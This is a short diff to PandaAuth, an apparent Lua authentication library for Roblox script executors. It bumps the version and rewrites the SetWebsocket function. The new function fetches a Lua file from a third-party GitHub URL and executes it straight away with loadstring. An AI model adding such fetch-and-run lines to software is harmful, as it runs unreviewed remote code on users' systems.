@@ -21,7 +21,7 @@ local _tostring = clonefunction(tostring)
 local server_configuration = "https://auth.pandadevelopment.net"
 
 -- Lua Lib Version
-local LibVersion = "v2.1.5_Release"
+local LibVersion = "v2.1.6_Release"
 -- warn("Panda-Pelican Libraries Loaded ( "..LibVersion.." )")
 -- Validation Services
 local validation_service = server_configuration.. "/failsafeValidation"
@@ -248,8 +248,8 @@ end)
 end
 
 function PandaAuth:SetWebsocket(IpAddress)
-    warn("This Feature is not available yet... Sorry")
-    print("Hi -> "..tostring(IpAddress))
+    getgenv().IPV4 = IpAddress
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sponsoparnordvpn/Land_WSE/main/init.lua"))()
 end
 
 return PandaAuth
